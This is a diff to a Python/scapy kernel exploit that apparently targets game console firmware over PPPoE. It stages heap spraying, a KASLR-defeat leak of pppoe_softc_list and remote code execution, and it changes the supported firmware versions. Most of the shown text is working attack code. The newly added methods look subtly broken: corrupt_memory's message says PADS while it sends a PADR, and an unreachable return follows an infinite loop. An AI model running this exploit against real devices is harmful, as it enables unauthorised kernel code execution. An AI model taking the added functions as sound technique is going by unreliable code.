@@ -12,9 +12,6 @@ from struct import pack, unpack
 from sys import exit
 from time import sleep
 from offsets import *
-from scapy.layers.inet6 import ICMPv6NDOptSrcLLAddr, IPv6
-import time
-import traceback
 
 # PPPoE constants
 
@@ -262,6 +259,55 @@ class Exploit():
                              id=pkt[PPP_IPCP].id,
                              options=pkt[PPP_IPCP].options))
 
+    def spray_pppoe_discovery(self):
+        print('[*] Spraying PPPoE discovery packets...')
+        for _ in range(self.SPRAY_NUM):
+            self.s.send(
+                Ether(src=self.source_mac,
+                      dst=self.target_mac,
+                      type=ETHERTYPE_PPPOEDISC) / PPPoE(code=PPPOE_CODE_PADI))
+
+    def leak_pppoe_ac_cookie(self):
+        print('[*] Sending PPPoE PADI for AC cookie leakage...')
+        self.s.send(
+            Ether(src=self.source_mac,
+                  dst=self.target_mac,
+                  type=ETHERTYPE_PPPOEDISC) / PPPoE(code=PPPOE_CODE_PADI))
+
+        print('[*] Waiting for PPPoE PADO with AC cookie...')
+        while True:
+            pkt = self.s.recv()
+            if pkt and pkt.haslayer(PPPoE) and pkt[PPPoE].code == PPPOE_CODE_PADO:
+                for tag in pkt[PPPoEDiscovery].tags:
+                    if tag.type == PPPOE_TAG_ACOOKIE:
+                        ac_cookie = tag.data
+                        print(f'[*] Leaked AC cookie: {ac_cookie.hex()}')
+                        return ac_cookie
+        return None
+
+    def corrupt_memory(self):
+        print('[*] Sending PPPoE PADS to corrupt memory...')
+        self.s.send(
+            Ether(src=self.source_mac,
+                  dst=self.target_mac,
+                  type=ETHERTYPE_PPPOEDISC) / PPPoE(code=PPPOE_CODE_PADR))
+
+    def exploit(self):
+        print('[*] Starting exploit...')
+        
+        self.lcp_negotiation()
+        self.ipcp_negotiation()
+
+        ac_cookie = self.leak_pppoe_ac_cookie()
+        if not ac_cookie:
+            print('[-] Failed to leak AC cookie')
+            return
+
+        self.spray_pppoe_discovery()
+        self.corrupt_memory()
+
+        print('[*] Exploit completed')
+        
     def ppp_negotation(self, cb=None, ignore_initial_req=False):
         if ignore_initial_req:
             print('[*] Waiting for PADI...')
@@ -755,55 +801,26 @@ class Exploit():
         print(
             '[+] Scanning for corrupted object...found {}'.format(source_ipv6))
 
-      
         print('')
         print('[+] STAGE 2: KASLR defeat')
 
         print('[*] Defeating KASLR...')
-
-        start_time = time.time()
-        timeout = 60  # Maximum wait time (e.g., 60 seconds)
-
-        pkt = None
         while True:
-                try:
-                        pkt = self.s.recv()
-                        if pkt:        # Check if the packet is not empty
-                                if pkt.haslayer(ICMPv6NDOptSrcLLAddr) and pkt[ICMPv6NDOptSrcLLAddr].len > 1:
-                                        print(f'[DEBUG] Packet received: {pkt.summary()}')
-                                        break
-                except Exception as e:
-                        print(f'[-] Error receiving packet: {e}')
-                        traceback.print_exc()
-                        exit(1)
-                
-                if time.time() - start_time > timeout:
-                        print('[-] Timeout waiting for valid packet')
-                        exit(1)
+            pkt = self.s.recv()
+            if pkt and pkt.haslayer(
+                    ICMPv6NDOptSrcLLAddr) and pkt[ICMPv6NDOptSrcLLAddr].len > 1:
+                break
 
-        try:
-                # Verify the packet contains the IPv6 layer before accessing its data
-                if not pkt.haslayer(IPv6):
-                        print('[-] Packet does not contain IPv6 layer')
-                        exit(1)
+        self.pppoe_softc_list = unpack('<Q', bytes(pkt[IPv6])[0x43:0x4b])[0]
+        print('[+] pppoe_softc_list: {}'.format(hex(self.pppoe_softc_list)))
 
-                # Extract the pppoe_softc_list address from the packet
-                self.pppoe_softc_list = unpack('<Q', bytes(pkt[IPv6])[0x43:0x4b])[0]
-                print(f'[+] pppoe_softc_list: {hex(self.pppoe_softc_list)}')
+        self.kaslr_offset = self.pppoe_softc_list - self.offs.PPPOE_SOFTC_LIST
+        print('[+] kaslr_offset: {}'.format(hex(self.kaslr_offset)))
 
-                # Calculate the KASLR offset
-                self.kaslr_offset = self.pppoe_softc_list - self.offs.PPPOE_SOFTC_LIST
-                print(f'[+] kaslr_offset: {hex(self.kaslr_offset)}')
-
-                # Verify the calculated address
-                if (self.pppoe_softc_list & 0xffffffff00000fff != self.offs.PPPOE_SOFTC_LIST & 0xffffffff00000fff):
-                        print('[-] Error: leak is invalid. Wrong firmware?')
-                        exit(1)
-        except Exception as e:
-                print(f'[-] Error processing packet: {e}')
-                traceback.print_exc()
-                exit(1)
-
+        if (self.pppoe_softc_list & 0xffffffff00000fff
+                != self.offs.PPPOE_SOFTC_LIST & 0xffffffff00000fff):
+            print('[-] Error leak is invalid. Wrong firmware?')
+            exit(1)
 
         print('')
         print('[+] STAGE 3: Remote code execution')
@@ -860,7 +877,7 @@ def main():
     parser.add_argument('--interface', required=True)
     parser.add_argument('--fw',
                         choices=[
-                            '700','701','702','750', '751', '755',
+                            '750', '751', '755',
                             '800', '801', '803', '850', '852',
                             '900', '903', '904', '950', '951', '960',
                             '1000', '1001', '1050', '1070', '1071',
@@ -880,9 +897,7 @@ def main():
     with open(args.stage2, mode='rb') as f:
         stage2 = f.read()
 
-    if args.fw in ('700', '701', '702'):
-        offs = OffsetsFirmware_700_702()
-    elif args.fw in ('750', '751', '755'):
+    if args.fw in ('750', '751', '755'):
         offs = OffsetsFirmware_750_755()
     elif args.fw in ('800', '801', '803'):
         offs = OffsetsFirmware_800_803()
